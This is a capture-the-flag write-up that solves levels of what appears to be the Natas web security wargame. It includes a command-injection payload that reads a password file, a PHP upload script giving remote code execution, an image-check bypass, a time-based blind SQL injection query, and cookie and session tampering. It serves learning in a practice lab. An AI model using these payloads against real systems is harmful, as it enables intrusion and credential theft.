The source indicated we are including a file
```php
include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>

```
So I added to the url path and found the secret there.

I just reversed this 
```php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```
decode of `3d3d516343746d4d6d6c315669563362` is `==QcCtmMml1ViV3b`  
reverse: `b3ViV1lmMmtCcQ==`

; is not allowed but the ascii value if ; is 3B so I wrote
```bash
k $(printf "\\x3B") cat /etc/natas_webpass/natas11 $(printf "\\x3B") echo

Data is loaded from cookies

```php
function loadData($def) {
    global $_COOKIE;
    .
    .
    .
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    .
    .
    .
}

$data = loadData($defaultdata);
```
I needed to reverse the encryption. Initially, I had the color 0xffffff. After decoding the saved data of the cookie and changing it to 0x000000, I observed the difference.
```
for 0xffffff
0l;$$98-8=?#9*jvi 'ngl*+(!$#9lrnh(.*-(.n67
for 0x000000
0l;$$98-8=?#9*jvi 'ngl*+(!$#9lrnh~x|{~xn67
```
It's easy to notice that the changed characters were `~x|{~,` and the repeated key is also quite apparent.
```php 
function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
```
Breaking the encryption was straightforward because of the property that if a ^ b = c, then a ^ c = b. You can access the Python script [here](./natas11/reverse.py) that I used to re-encrypt it, edit the cookie, and obtain the solution.

## Level 11 â†’ Level 12
In this challenge, I was tasked with uploading a file, as shown below:   
![Alt text](image-4.png)   
After uploading the file, the system provided me with a link to access the uploaded file. My objective was to write a PHP script to retrieve and display the contents of the password file, essentially achieving Remote Code Execution (RCE).

I used Burp to modify the file's content and turned it into a PHP script. The transformation looked like this:

I used burp to edit the file content to php script.

From this

To this:

```php
<?php
$fileContents = file_get_contents('/etc/natas_webpass/natas13');
if ($fileContents === false) {
    echo 'Failed to read the file.';
} else {
    echo $fileContents;
}
?>
```

## Level 12 â†’ Level 13
Same as above but now it prevents none image file by adding.

```php
else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    }
```
According to the function documentation
```
exif_imagetype() reads the first bytes of an image and checks its signature.
```
So I just left the first byte to be an image magic.

For this challenge. My solution was:
1. Cat password file to temp.
2. Give it 777 permissions
3. Access level 9 where it was much easier running commands 
4. print this file.

[Challenge](./natas17/reverse.php)  
Completely blind SQL injection.
Firstly, I have to mention that the only way to crack this was by creating my own MySQL containers on my local computer and learning how SQL works ðŸ™ˆ (it's been a long time since I last used MySQL).
My solution was:
```sql
SELECT * from users where username="natas18" UNION SELECT username=natas18 and IF(binary SUBSTRING(password,{i},1)=CHAR({ch}), sleep(3), "false"),"1" from users where "1"="1"
```
The full solution is [here](./natas17/e.py).

Let's break this query down to understand it.

1. SELECT * from users where username="natas18": This is the original query, selecting all columns (*) from the "users" table where the username is "natas18."

2. UNION: This is used to combine the results of the first query with the results of another query.

3. SELECT username=natas18 and IF(binary SUBSTRING(password,{i},1)=CHAR({ch}), sleep(3), "false"),"1" from users where "1"="1": This is the injected part of the query.

4. username=natas18: Assigns the value "natas18" to the column "username" in the second part of the union.

5. IF(binary SUBSTRING(password,{i},1)=CHAR({ch}), sleep(3), "false"): This is a conditional statement. It checks if the i-th character of the password, when converted to binary and compared to the character represented by the ASCII value {ch}, is true. If true, it causes a delay of 3 seconds using sleep(3). Otherwise, it returns "false."

6. "1" from users where "1"="1": This is added to complete the syntax.

## Level 17 â†’ Level 18

Session hijacking was a topic I wasn't initially well-versed in. However, one red flag that caught my attention was the comment in the code:
```php
$maxid = 640; // 640 should be enough for everyone
```
The phrase "should be enough" or the classic "what could possibly go wrong" always sets off a warning signal. The vulnerability lies in the challenge where one can enumerate all session IDs until the admin session ID is captured. It's crucial to always adhere to best practices.

They encoded the random number as ASCII and concatenated it with the ASCII representation of -$username.

There are two files involved in this challenge.  
[main](./natas21/reverse.php)  
[Another page](./natas21/reverse2.php)  
The interesting (or concerning) aspect of the second page is that it shares the same session as the main page.  
After injecting "admin=1," I utilized the cookies to connect to the main page, and that's it. I am now a manager.
